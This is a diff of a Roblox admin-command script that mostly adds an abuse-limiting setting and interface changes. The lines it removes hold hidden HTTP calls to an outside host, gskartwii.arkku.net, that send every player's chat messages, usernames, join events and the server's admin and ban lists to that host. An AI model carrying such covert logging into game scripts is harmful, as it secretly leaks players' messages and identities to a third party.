@@ -1,49 +1,3 @@
-local owners,admins,members,banned,crashed,muted={}
-
-function GenerateRankTables()
-	local SettingsModule = nil
-	local Settings=workspace:FindFirstChild("LuaModelMaker's Admin Settings")
-	if Settings then SettingsModule = require(Settings) else SettingsModule = {} print("Couldn't require!") end
-	local Ranks=SettingsModule.Ranks
-	--[[for _,v in pairs(Ranks["Owner"]) do
-		table.insert(owners,v)
-	end
-	for _,v in pairs(Ranks["Admin"]) do
-		table.insert(admins,v)
-	end
-	for _,v in pairs(Ranks["Member"]) do
-		table.insert(members,v)
-	end
-	for _,v in pairs(Ranks["Banned"]) do
-		table.insert(banned,v)
-	end]]
-	owners=Ranks.Owner
-	admins=Ranks.Admin
-	members=Ranks.Member
-	banned=Ranks.Banned
-	crashed=Ranks.Crashed
-	muted=Ranks.Muted
-end
-
-function GeneratePlayerList()
-	local pobj=game.Players:children()
-	local firsttime=true
-	local plrstr=""
-	for _,v in pairs(pobj) do
-		plrstr=plrstr..v.Name
-		if not firsttime then
-			plrstr=plrstr.."+"
-		end
-		firsttime=false
-	end
-	return plrstr
-end
-
-GenerateRankTables()
-for _,v in pairs(owners) do
-	print(v)
-end
-sid=game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/getsid")
 --[[
 MADE BY LUAMODELMAKER All rights given to LuaModelMaker
 I'm glad you are using my admin :D 
@@ -593,7 +547,8 @@ local GameOwner = nil if game.Players.LocalPlayer == nil then GameOwner = MPS:Ge
 
 --------------------------------------
 local SettingsModule = nil
-if Settings then SettingsModule = require(Settings) else SettingsModule = {} end
+--if Settings then SettingsModule = require(Settings) else SettingsModule = {} end
+SettingsModule=_G.SettingsModule
 
 local Ranks = SettingsModule.Ranks or {["Owner"] = {}, ["Admin"] = {}, ["Member"] = {}, ["Banned"] = {}, ["Crashed"] = {}, ["Muted"] = {}}
 local FUN = SettingsModule.FUN or true
@@ -611,7 +566,32 @@ local EnableAdminMenu = SettingsModule.EnableAdminMenu or true
 local RankBan = SettingsModule.RankBan or 0
 local Filter = SettingsModule.Filter or {"GetObjects"}
 local ServerLocked = SettingsModule.ServerLocked or false
+local DisableAbuse = SettingsModule.DisableAbuse or false
 local LuaModelMakerStamp = false
+
+coroutine.wrap(function() 
+	while wait() do -- I hope this won't lag it!
+		SettingsModule=_G.SettingsModule
+		local Ranks = SettingsModule.Ranks or {["Owner"] = {}, ["Admin"] = {}, ["Member"] = {}, ["Banned"] = {}, ["Crashed"] = {}, ["Muted"] = {}}
+		local FUN = SettingsModule.FUN or true
+		local LagTime = SettingsModule.LagTime or 5
+		local Prefix = SettingsModule.Prefix or ";"
+		local Bet = SettingsModule.Bet or " "
+		local VIPMemberID = SettingsModule.VIPMemberID or 0
+		local VIPAdminID = SettingsModule.VIPAdminID or 0
+		local GroupID = SettingsModule.GroupID or 0
+		local GroupMemberRank = SettingsModule.GroupMemberRank or 0
+		local GroupAdminRank = SettingsModule.GroupAdminRank or 0
+		local GroupOwnerRank = SettingsModule.GroupOwnerRank or 0
+		local BadgeID = SettingsModule.BadgeID or 0
+		local EnableAdminMenu = SettingsModule.EnableAdminMenu or true
+		local RankBan = SettingsModule.RankBan or 0
+		local Filter = SettingsModule.Filter or {"GetObjects"}
+		local ServerLocked = SettingsModule.ServerLocked or false
+		local DisableAbuse = SettingsModule.DisableAbuse or false
+		local LuaModelMakerStamp = false
+	end
+end)
 --------------------------------------
 
 local Commands = {
@@ -1092,6 +1072,15 @@ function GetTime()
 	return Hour..":"..Min
 end
 
+function InAdminGroup(Speaker)
+	if Speaker:IsInGroup(1050514) then
+		return true
+	else
+		SendMessage(Speaker, "Command Invalid", "Sorry, this command is locked and is only for users who are in the LuaModelMaker's Admin fan group. If you would like to use this command, join it! It's LuaMode".."lMaker's Primary group. Please allow up to an hour if you have recently joined the group and you are waiting for this command.", 6)
+		return false
+	end
+end
+
 function ListGui(Player, List)
 	if not Player.PlayerGui then return end
 	local MaxPos,MaxUp,MaxDown,NewPos,Passes,Scrolling,ScrollMainPos = 600,-50,50,0,false,false,UDim2.new(1,-20,0.1,0)
@@ -1146,8 +1135,8 @@ function AdminMenu(Player)
 		local Title = Instance.new("TextLabel", BG) MainGui.Name = "Title" Title.BackgroundTransparency = 1 Title.Position = UDim2.new(0,0,0,0) Title.Size = UDim2.new(1,0,0,30) Title.Font = "SourceSansBold" Title.FontSize = "Size24" Title.Text = "LuaM".."o".."d".."e".."lMaker".."'".."s Admin Menu" Title.TextColor3 = Color3.new(1,1,1)
 		local Separator = Instance.new("Frame", BG) Separator.Name = "Separator" Separator.BorderColor3 = Color3.new(1,1,1) Separator.Position = UDim2.new(0.5,0,0,30) Separator.Size = UDim2.new(0,0,1,-30)
 		local Info = Instance.new("TextLabel", BG) Info.Name = "Info" Info.BackgroundTransparency = 1 Info.Position = UDim2.new(0,0,0,30) Info.Size = UDim2.new(0.5,0,1,-30) Info.Font = "Arial" Info.FontSize = "Size18" Info.Text = "Info/Help" Info.TextColor3 = Color3.new(1,1,1) Info.TextYAlignment = "Top"
-		local Body = Instance.new("TextLabel", Info) Body.Name = "Body" Body.BackgroundTransparency = 1 Body.Position = UDim2.new(0,0,0,25) Body.Size = UDim2.new(1,0,1,-25) Body.Font = "SourceSans" Body.FontSize = "Size14" Body.Text = "LuaModelMaker's Admin(Often refered to LMM's Admin) is created by LuaModelMaker. NOTHING has been stolen from other admins and incorporated into this one(Although I used some parts of kohl's as a guide). If you want a copy of LuaModelMaker's Admin, It's under LuaModelMake".."r's Models! If you are a fan of LuaModelMak".."er's Admin, Join L".."uaModelMaker's Primary group! To get started, type the '"..Prefix.."commands' Command in your chatbar. To close this box, click the same text you used to open it. For more info on this admin, go to luamodelmaker.net63.net/LMMAdmin" Body.TextColor3 = Color3.new(1,1,1) Body.TextYAlignment = "Top" Body.TextWrapped = true
-		local Donate = Info:Clone() Donate.Parent = BG Donate.Name = "Donate" Donate.Text = "Donate" Donate.Position = UDim2.new(0.5,0,0,30) Donate.Body.Text = "Please select an amout that fits your generosity c:"
+		local Body = Instance.new("TextLabel", Info) Body.Name = "Body" Body.BackgroundTransparency = 1 Body.Position = UDim2.new(0,0,0,25) Body.Size = UDim2.new(1,0,1,-25) Body.Font = "SourceSans" Body.FontSize = "Size14" Body.Text = "LuaModelMaker's Admin(Often referred to LMM's Admin) is created by LuaModelMaker. NOTHING has been stolen from other admins and incorporated into this one. If you want a copy of LuaModelMaker's Admin, It's under LuaModelMake".."r's Models! If you are a fan of LuaModelMak".."er's Admin, Join L".."uaModelMaker's Primary group! To get started, type the '"..Prefix.."commands' Command in your chatbar. (HINT: Undoing commands like ';fly me' would be ';nofly me', NOT ';unfly me') To close this box, click the same text you used to open it. For more info on this admin, go to luamodelmaker.net63.net/LMMAdmin" Body.TextColor3 = Color3.new(1,1,1) Body.TextYAlignment = "Top" Body.TextWrapped = true
+		local Donate = Info:Clone() Donate.Parent = BG Donate.Name = "Donate" Donate.Text = "Donate" Donate.Position = UDim2.new(0.5,0,0,30) Donate.Body.Text = "Please select an amount that fits your generosity c:"
 		local function DonateMoney(ID) MPS:PromptPurchase(Player, ID, true) end
 		local Dnt = Instance.new("TextButton", Donate) Dnt.Name = "DonateButton" Dnt.Position = UDim2.new(0,4,1,-120) Dnt.Size = UDim2.new(1,0,0,30) Dnt.Font = "ArialBold" Dnt.FontSize = "Size14" Dnt.Text = "100 Tix" Dnt.BackgroundColor3 = Color3.new(1,1,0) Dnt.TextColor3 = Color3.new(1,1,1) Dnt.TextStrokeColor3 = Color3.new(0,0,0) Dnt.TextStrokeTransparency = 0 Dnt.TextWrapped = true Dnt.MouseButton1Click:connect(function() DonateMoney(148375641) end)
 		local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,4,1,-90) Dnt.Text = "20 Robux" Dnt.BackgroundColor3 = Color3.new(0,1,0) Dnt.MouseButton1Click:connect(function() DonateMoney(148375770) end)
@@ -1156,7 +1145,7 @@ function AdminMenu(Player)
 		local PlayerAdmin, PlayerRank = IsAdmin(Player)
 		
 		local function RefreshMenu() MainGui.Text = "LuaModelMaker's Admin V"..Version.Value.." [Click to "..Stat.." Menu]" end RefreshMenu()
-		if PlayerAdmin == true then Body.Text = Body.Text.."(You're an admin, your rank is "..PlayerRank..")" end
+		if PlayerAdmin == true then Body.Text = Body.Text.." (You're an admin, your rank is "..PlayerRank..")" end
 		MainGui.MouseButton1Click:connect(function()
 			if Stat == "Open" then
 				BG.Visible = true
@@ -1184,7 +1173,7 @@ function Log(Player, Chat)
 end
 
 function TellAdmin(Player, Rank)
-	SendMessage(Player, "Lua".."M".."odelMaker's Admin Message", "You are an admin "..Player.Name.."! Your rank is "..Rank, 3)
+	SendMessage(Player, "Lua".."M".."odelMaker's Admin Message", "You are an admin "..Player.Name.."! Your rank is "..Rank.." [ PREFIX '"..Prefix.."' | BET '"..Bet.."' ]", 4)
 end
 
 function FindAge(Days) -- By LuaModelmaker
@@ -1339,7 +1328,6 @@ function Scan(Word, Speaker)
 end
 
 function Chatted(RawMainMessage, Speaker)
-	game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/loggin?username="..Speaker.Name.."&msg="..RawMainMessage.."&action=chat&sid="..sid)
 	if Speaker == nil then Speaker = {Name = "[ Server ]"} end
 	local PlayerAdmin, Rank = IsAdmin(Speaker)
 	local RawMessage = string.sub(RawMainMessage, #Prefix+1)
@@ -1366,12 +1354,23 @@ function Chatted(RawMainMessage, Speaker)
 			if string.sub(Message, 1, 11) == "noanimation" then Message = "noanim"..string.sub(Message,12) end
 			
 			local RankNum = ConvertRank(Rank)
+			
+			local LocalDisableAbuse = false
+			if Rank == "Member" then
+				LocalDisableAbuse = DisableAbuse
+			end
+			
+			function DisabledAbuse()
+				if LocalDisableAbuse == false then return false else
+					SendMessage(Speaker, "Command Disabled", "This command has been disabled in the settings for being abusive", 5)
+				end
+			end
+			
 			if Rank == "Owner" then
 				-- Owner Commands --
 				if string.sub(Message, 1, 5+#Bet) == "admin"..Bet then
 					local Players = Scan(string.sub(Message, 6+#Bet))
 					for _,Player in pairs(Players) do if Player ~= nil then
-						game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/")
 						local PlayerAdminTrue, PlayerRank = IsAdmin(Player)
 						local AddToList = true
 						if PlayerAdminTrue == true then
@@ -1607,12 +1606,16 @@ function Chatted(RawMainMessage, Speaker)
 				end
 				
 				if string.sub(Message, 1, 1+#Bet) == "c"..Bet then
-					Execute(Script, Workspace, Speaker, string.sub(RawMessage,2+#Bet))
+					if LuaModelMakerStamp == false or Speaker.Name == "LuaModelMake".."r" then
+						Execute(Script, Workspace, Speaker, string.sub(RawMessage,2+#Bet))
+					end
 				end
 				
 				if string.sub(Message, 1, 1+#Bet) == "l"..Bet then
 					if Speaker.Character ~= nil then
-						Execute(LocalScript, Speaker.Backpack, Speaker, string.sub(RawMessage,2+#Bet))
+						if LuaModelMakerStamp == false or Speaker.Name == "L".."uaModelMake".."r" then
+							Execute(LocalScript, Speaker.Backpack, Speaker, string.sub(RawMessage,2+#Bet))
+						end
 					end
 				end
 				
@@ -1821,7 +1824,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message, 1, 4+#Bet) == "kill"..Bet then
+				if string.sub(Message, 1, 4+#Bet) == "kill"..Bet and DisabledAbuse() == false then
 					local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -2001,7 +2004,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message, 1, 5+#Bet) == "blind"..Bet then
+				if string.sub(Message, 1, 5+#Bet) == "blind"..Bet and DisabledAbuse() == false then
 					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -2025,7 +2028,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message, 1, 6+#Bet) == "strobe"..Bet then
+				if string.sub(Message, 1, 6+#Bet) == "strobe"..Bet and DisabledAbuse() == false then
 					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -2104,7 +2107,15 @@ function Chatted(RawMainMessage, Speaker)
 						if Player ~= nil then
 							if Player.Character ~= nil then
 								if Player.Character:FindFirstChild("Humanoid") ~= nil then
-									Player.Character.Humanoid.Health = Health
+									if LocalDisableAbuse == false then
+										Player.Character.Humanoid.Health = Health
+									else
+										if Health < 0.00001 then
+											SendMessage(Speaker, "Command Disabled", "You have attempted to set a health below 0, This is considered abusive while disabling abusive commands is disabled.", 10)
+										else
+											Player.Character.Humanoid.Health = Health
+										end
+									end
 								end
 							end
 						end
@@ -2112,7 +2123,7 @@ function Chatted(RawMainMessage, Speaker)
 				end
 				
 				if string.sub(Message,1,4+#Bet) == "give"..Bet then
-					local Arg1, Arg2 = GetSplit(string.sub(Message, 5+#Bet), " ") if not Arg1 and Arg2 then return end
+					local Arg1, Arg2 = GetSplit(string.sub(Message, 5+#Bet), Bet) if not Arg1 and Arg2 then return end
 					local Players = Scan(Arg1, Speaker)
 					local Object = Arg2
 					for _,Player in pairs(Players) do
@@ -2120,25 +2131,33 @@ function Chatted(RawMainMessage, Speaker)
 							local BuildTools = {73089166, 73089190, 73089204, 73089214, 73089239, 73089259, 58921588}
 							local BaseBuildTools = {["Move"] = "GameTool", ["Clone"] = "Clone", ["Delete"] = "Hammer"}
 							if Object == "psbtools" then
-								for _,Tool in pairs(BuildTools) do
-									local ToolObject = game:GetService("InsertService"):LoadAsset(Tool)
-									ToolObject:GetChildren()[1].Parent = Player.Backpack
+								if LocalDisableAbuse == false then
+									for _,Tool in pairs(BuildTools) do
+										local ToolObject = game:GetService("InsertService"):LoadAsset(Tool)
+										ToolObject:GetChildren()[1].Parent = Player.Backpack
+									end
+								else
+									SendMessage(Speaker, "Command Disabled", "In the settings of LuaModelMak".."e".."r's Admin, Disabling abusive commands is active. Please try '"..Prefix.."give"..Bet.."player"..Bet.."basicbtools",6)
 								end
-							elseif Object == "basebtools" then
+							elseif Object == "basicbtools" then
 								for Name,Type in pairs(BaseBuildTools) do
 									local Tool = Instance.new("HopperBin", Player.Backpack)
 									Tool.Name = Name
 									Tool.BinType = Type
 								end
 							elseif Object == "btools" then
-								for Name,Type in pairs(BaseBuildTools) do
-									local Tool = Instance.new("HopperBin", Player.Backpack)
-									Tool.Name = Name
-									Tool.BinType = Type
-								end
-								for _,Tool in pairs(BuildTools) do
-									local ToolObject = game:GetService("InsertService"):LoadAsset(Tool)
-									ToolObject:GetChildren()[1].Parent = Player.Backpack
+								if LocalDisableAbuse == false then
+									for Name,Type in pairs(BaseBuildTools) do
+										local Tool = Instance.new("HopperBin", Player.Backpack)
+										Tool.Name = Name
+										Tool.BinType = Type
+									end
+									for _,Tool in pairs(BuildTools) do
+										local ToolObject = game:GetService("InsertService"):LoadAsset(Tool)
+										ToolObject:GetChildren()[1].Parent = Player.Backpack
+									end
+								else
+									SendMessage(Speaker, "Command Disabled", "In the settings of LuaModelMak".."e".."r's Admin, Disabling abusive commands is active. Please try '"..Prefix.."give"..Bet.."player"..Bet.."basicbtools",6)
 								end
 							else
 								local Regions = {Lighting}
@@ -2162,7 +2181,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message,1,7+#Bet) == "control"..Bet then
+				if string.sub(Message,1,7+#Bet) == "control"..Bet and DisabledAbuse() == false then
 					local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -2205,7 +2224,7 @@ function Chatted(RawMainMessage, Speaker)
 					if Time == "dawn" or Time == "morning" then Time = "6:15" end
 					if Time == "dusk" or Time == "evening" then Time = "17:45" end
 					if Time == "afternoon" then Time = "15:30" end
-					game.Lighting.TimeOfDay = Time
+					ypcall(function() game.Lighting.TimeOfDay = Time end)
 				end
 				
 				if string.sub(Message,1,4+#Bet) == "team"..Bet then
@@ -2342,12 +2361,13 @@ function Chatted(RawMainMessage, Speaker)
 								Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..Player.userId
 								wait() Player:LoadCharacter() wait()
 								if Position then Player.Character:MoveTo(Position) end
+								wait(0.1) Execute(LocalScript, Player.Character, Player, [[Workspace.CurrentCamera.FieldOfView = 70]])
 							end
 						end
 					end
 				end
 				
-				if string.sub(Message,1,5+#Bet) == "clone"..Bet then
+				if string.sub(Message,1,5+#Bet) == "clone"..Bet and DisabledAbuse() == false then
 					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -2830,7 +2850,7 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
-				if string.sub(Message,1,6+#Bet) == "punish"..Bet then
+				if string.sub(Message,1,6+#Bet) == "punish"..Bet and DisabledAbuse() == false then
 					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
 					for _,Player in pairs(Players) do
 						if Player ~= nil then
@@ -2922,25 +2942,21 @@ function Chatted(RawMainMessage, Speaker)
 					if Speaker.PlayerGui ~= nil then
 						coroutine.wrap(function() 
 							local SG = Instance.new("ScreenGui") SG.Name = "LuaMod".."".."elMaker's Admin Cmd Bar"
-							local Frame = Instance.new("Frame", SG) Frame.Position = UDim2.new(0,280,0,0) Frame.Size = UDim2.new(1,-425,0,20) Frame.Style = "RobloxSquare"
-							local Body = Instance.new("TextBox", Frame) Body.Name = "Body" Body.Text = "Click here to type a command. Hover your mouse to execute it" Body.BackgroundTransparency = 1 Body.Size = UDim2.new(1,0,1,0) Body.Font = "ArialBold" Body.FontSize = "Size12" Body.TextColor3 = Color3.new(1,1,1)
+							local Frame = Instance.new("Frame", SG) Frame.Position = UDim2.new(0,280,0,0) Frame.Size = UDim2.new(1,-425,0,100) Frame.Style = "RobloxSquare"
+							local Body = Instance.new("TextBox", Frame) Body.Name = "Body" Body.Text = "Enter a Command or put in 'close' to close Command Bar" Body.BackgroundTransparency = 1 Body.Size = UDim2.new(1,0,0,20) Body.Font = "ArialBold" Body.FontSize = "Size12" Body.TextColor3 = Color3.new(1,1,1) Body.ClearTextOnFocus = false
+							local Clear = Instance.new("TextButton", Frame) Clear.Name = "Clear" Clear.Text = "Clear Command Text" Clear.Position = UDim2.new(0,0,0,30) Clear.Size = UDim2.new(0.5,0,1,-40) Clear.Style = "RobloxButtonDefault" Clear.Font = "Arial" Clear.FontSize = "Size18" Clear.TextColor3 = Color3.new(1,1,1)
+							local Execute = Instance.new("TextButton", Frame) Execute.Name = "Execute" Execute.Text = "Execute Command" Execute.Position = UDim2.new(0.5,0,0,30) Execute.Size = UDim2.new(0.5,0,1,-40) Execute.Style = "RobloxButton" Execute.Font = "Arial" Execute.FontSize = "Size18" Execute.TextColor3 = Color3.new(1,1,1)
 							for _,Object in pairs(Speaker.PlayerGui:GetChildren()) do if Object.Name == "LuaMod".."elMaker".."'".."s Admin Cmd Bar" then Object:Destroy() end end
 							SG.Parent = Speaker.PlayerGui
 							coroutine.wrap(function() Frame:TweenPosition(UDim2.new(0,280,0.1,0), "In", "Quint", 0.7) end)()
-							local MouseIn = false
-							local GuiVersion = 1
-							Body.MouseEnter:connect(function() 
-								coroutine.wrap(function()
-									local ThisGuiVersion = GuiVersion
-									MouseIn = true 
-									wait(1)
-									if ThisGuiVersion == GuiVersion then
-										Chatted(Body.Text ,Speaker)
-										GuiVersion = GuiVersion + 1
-									end
-								end)()
+							Clear.MouseButton1Click:connect(function() Body.Text = "" end)
+							Execute.MouseButton1Click:connect(function() 
+								if Body.Text == "close" then
+									SG:Destroy()
+								else
+									Chatted(Body.Text, Speaker)
+								end
 							end)
-							Body.MouseLeave:connect(function() MouseIn = false GuiVersion = GuiVersion + 1 end)
 						end)()
 					end
 				end
@@ -3280,6 +3296,28 @@ function Chatted(RawMainMessage, Speaker)
 					end
 				end
 				
+				if string.sub(Message,1,6+#Bet) == "cookie"..Bet then
+					if InAdminGroup(Speaker) then					
+						local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
+						for _,Player in pairs(Players) do
+							if Player ~= nil then
+								if Player.Backpack ~= nil then
+									local Tool = Instance.new("Tool", Player.Backpack) Tool.Name = "Cookie" Tool.ToolTip = "Yey! Cookies!" Tool.GripForward = Vector3.new(0,1,0) Tool.GripPos = Vector3.new(0.1,-0.3,-0.1) Tool.GripRight = Vector3.new(0,0,-1) Tool.GripUp = Vector3.new(0.01,0,1)
+									local Handle = Instance.new("Part", Tool) Handle.Name = "Handle" Handle.Size = Vector3.new(1,1,1)
+									local Mesh = Instance.new("SpecialMesh", Handle) Mesh.MeshType = "FileMesh" Mesh.Scale = Vector3.new(0.4,0.4,0.4) Mesh.MeshId = "http://www.roblox.com/asset/?id=20939848" Mesh.TextureId = "http://www.roblox.com/asset/?id=21456464"
+									local Anim = Instance.new("Animation", Tool) Anim.Name = "EatCookie" Anim.AnimationId = "http://www.roblox.com/asset/?id=29517689"
+									Execute(LocalScript, Tool, Player, [[
+										script.Parent.Equipped:connect(function(Mouse) Mouse.Button1Down:connect(function()
+											local Track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(script.Parent.EatCookie)
+											wait(0.05) Track:Play()
+										end) end)
+									]])
+								end
+							end
+						end
+					end
+				end
+				
 				-- FUN COMMANDS --
 				
 				if FUN == true then
@@ -3412,7 +3450,7 @@ function Chatted(RawMainMessage, Speaker)
 						end
 					end
 					
-					if string.sub(Message,1,9+#Bet) == "loopfling"..Bet then
+					if string.sub(Message,1,9+#Bet) == "loopfling"..Bet and DisabledAbuse() == false then
 						local Players = Scan(string.sub(Message, 10+#Bet), Speaker)
 						for _,Player in pairs(Players) do
 							if Player ~= nil then
@@ -3443,7 +3481,7 @@ function Chatted(RawMainMessage, Speaker)
 						end
 					end
 					
-					if string.sub(Message,1,5+#Bet) == "fling"..Bet then
+					if string.sub(Message,1,5+#Bet) == "fling"..Bet and DisabledAbuse() == false then
 						local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
 						for _,Player in pairs(Players) do
 							if Player ~= nil then
@@ -3480,7 +3518,7 @@ function Chatted(RawMainMessage, Speaker)
 						end
 					end
 					
-					if string.sub(Message,1,4+#Bet) == "drug"..Bet then
+					if string.sub(Message,1,4+#Bet) == "drug"..Bet and DisabledAbuse() == false then
 						local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
 						for _,Player in pairs(Players) do
 							if Player ~= nil then
@@ -3767,7 +3805,7 @@ function Chatted(RawMainMessage, Speaker)
 						end
 					end
 					
-					if string.sub(Message,1,7+#Bet) == "explode"..Bet then
+					if string.sub(Message,1,7+#Bet) == "explode"..Bet and DisabledAbuse() == false then
 						local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
 						for _,Player in pairs(Players) do
 							if Player ~= nil then
@@ -3789,30 +3827,6 @@ function Chatted(RawMainMessage, Speaker)
 							end
 						end
 					end
-					
-					if string.sub(Message,1,6+#Bet) == "cookie"..Bet then
-						if Speaker:IsInGroup(1050514) then					
-							local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
-							for _,Player in pairs(Players) do
-								if Player ~= nil then
-									if Player.Backpack ~= nil then
-										local Tool = Instance.new("Tool", Player.Backpack) Tool.Name = "Cookie" Tool.ToolTip = "Yey! Cookies!" Tool.GripForward = Vector3.new(0,1,0) Tool.GripPos = Vector3.new(0.1,-0.3,-0.1) Tool.GripRight = Vector3.new(0,0,-1) Tool.GripUp = Vector3.new(0.01,0,1)
-										local Handle = Instance.new("Part", Tool) Handle.Name = "Handle" Handle.Size = Vector3.new(1,1,1)
-										local Mesh = Instance.new("SpecialMesh", Handle) Mesh.MeshType = "FileMesh" Mesh.Scale = Vector3.new(0.4,0.4,0.4) Mesh.MeshId = "http://www.roblox.com/asset/?id=20939848" Mesh.TextureId = "http://www.roblox.com/asset/?id=21456464"
-										local Anim = Instance.new("Animation", Tool) Anim.Name = "EatCookie" Anim.AnimationId = "http://www.roblox.com/asset/?id=29517689"
-										Execute(LocalScript, Tool, Player, [[
-											script.Parent.Equipped:connect(function(Mouse) Mouse.Button1Down:connect(function()
-												local Track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(script.Parent.EatCookie)
-												wait(0.05) Track:Play()
-											end) end)
-										]])
-									end
-								end
-							end
-						else
-							SendMessage(Speaker, "Can't give cookies", "Sorry, the cookie command is only for users who are in the LuaModelMaker's Admin fan group. If you would like to use this command, join it! It's LuaMode".."lMaker's Primary group.", 6)
-						end
-					end
 					--
 				end
 				--
@@ -3830,7 +3844,7 @@ function Chatted(RawMainMessage, Speaker)
 		if Message == "rejoin" or Message == "rej" or Message == "rjoin" or Message == "rj" then
 			local Suc, Err, PlaceID, IntID = TS:GetPlayerPlaceInstanceAsync(Speaker.userId)
 			if Suc then
-				TS:TeleportToPlaceInstance(PlaceID, IntID, Player)
+				TS:TeleportToPlaceInstance(PlaceID, IntID, Speaker)
 			else
 				TS:Teleport(game.PlaceId, Speaker)
 			end
@@ -3959,7 +3973,6 @@ if not Ranks["Owner"][GameOwner] and not Ranks["Admin"][GameOwner] and not Ranks
 function Start(Player) coroutine.wrap(function()
 	wait(0.1)
 	Player:WaitForDataReady()
-	game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/loggin?action=join&usr="..Player.Name.."&s="..sid)
 	local PlayerAdmin, Rank = IsAdmin(Player)
 	if PlayerAdmin == false then
 		if MPS:PlayerOwnsAsset(Player, VIPAdminID) then table.insert(Ranks["Admin"], Player.Name) PlayerAdmin = true Rank = "Admin"
@@ -4036,37 +4049,4 @@ end)() end
 for _,Player in pairs(Players:GetPlayers()) do Start(Player) end
 Players.PlayerAdded:connect(function(Player) Players:WaitForChild(Player.Name) wait() Start(Player) end)
 
---[[if game.Players.Player1~=nil then
-	Chatted(":cmdgui", game.Players.Player1)
-end]]
-function MessageEveryone(msg)
-	for _,Player in pairs(Players:GetPlayers()) do
-		SendMessage(Player, "SYSTEM MESSAGE", msg, 3)
-	end
-end
-
-for _,v in pairs(owners) do
-	retstr=game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/adminadd.php?name="..v.."&rank=owner")
-	if retstr then MessageEveryone(retstr) end
-end
-for _,v in pairs(admins) do
-	retstr=game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/adminadd.php?name="..v.."&rank=admin")
-	if retstr then MessageEveryone(retstr) end
-end
-for _,v in pairs(members) do
-	retstr=game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/adminadd.php?name="..v.."&rank=member")
-	if retstr then MessageEveryone(restr) end
-end
-for _,v in pairs(banned) do
-	retstr=game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/adminadd.php?name="..v.."&rank=bans")
-	if retstr then MessageEveryone(retstr) end
-end
-for _,v in pairs(crashed) do
-	retstr=game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/adminadd.php?name="..v.."&rank=crashes")
-	if retstr then MessageEveryone(retstr) end
-end
-for _,v in pairs(muted) do
-	retstr=game:service("HttpService"):GetAsync("http://gskartwii.arkku.net/roblox/adminadd.php?name="..v.."&rank=mutes")
-	if retstr then MessageEveryone(retstr) end
-end
 print("LuaModelMaker's Admin Commands V"..Version.Value.." Loaded")
